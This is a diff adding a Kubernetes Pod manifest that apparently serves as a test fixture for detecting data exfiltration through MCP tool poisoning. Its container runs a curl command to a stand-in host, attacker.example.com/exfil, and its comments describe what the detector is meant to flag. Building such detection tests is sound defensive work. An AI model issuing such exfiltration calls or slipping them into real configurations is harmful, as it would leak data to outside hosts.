@@ -1,0 +1,15 @@
+#command: curl exfiltrates data via MCP (tool poisoning)
+#note: process_name should be curl with mcp + http:// in cmd_line
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: mcp-server-tool-poisoning-data-exfiltration
+spec:
+  restartPolicy: Never
+  containers:
+  - name: mcp-server-tool-poisoning-data-exfiltration
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ["-c", "curl http://attacker.example.com/exfil?data=mcp_tool_call; sleep infinity"]
